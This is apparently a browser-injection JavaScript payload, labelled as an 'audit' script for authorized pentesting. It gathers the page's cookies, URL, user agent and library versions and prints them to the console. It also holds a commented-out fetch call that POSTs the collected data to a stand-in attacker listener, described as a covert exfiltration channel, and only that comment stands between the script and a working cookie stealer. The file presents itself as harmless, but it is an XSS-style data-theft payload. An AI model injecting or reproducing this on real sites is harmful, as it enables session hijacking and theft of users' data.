// Ghost Browser Audit Payload (audit.js)
// This is a safe, non-malicious script for authorized pentesting.

(function() {
    console.log("Ghost Audit: Payload injected.");

    // --- Data Collection ---
    let audit_data = {
        timestamp: new Date().toISOString(),
        url: window.location.href,
        cookies: document.cookie,
        user_agent: navigator.userAgent,
        csp: document.csp, // Note: This is a simplification. Real CSP is complex.
        js_libraries: [],
    };

    // Heuristic to detect common JS libraries
    if (window.jQuery) { audit_data.js_libraries.push(`jQuery ${window.jQuery.fn.jquery}`); }
    if (window.React) { audit_data.js_libraries.push("React"); }
    if (window.angular) { audit_data.js_libraries.push(`Angular ${window.angular.version.full}`); }

    console.log("Ghost Audit: Data collected.", audit_data);

    // --- Data Exfiltration ---
    // In a real mission, this would send the data back to the Ghost listener
    // via a covert channel (e.g., a WebSocket or a disguised POST request).
    // For this demonstration, we will log it to the console.

    // Example of how it *would* be sent:
    // fetch("https://your-ghost-listener.com/audit-beacon", {
    //     method: "POST",
    //     headers: { "Content-Type": "application/json" },
    //     body: JSON.stringify(audit_data)
    // });

    console.log("Ghost Audit: Exfiltration would happen here. For now, printing to console.");
    console.log(JSON.stringify(audit_data, null, 2));

})();
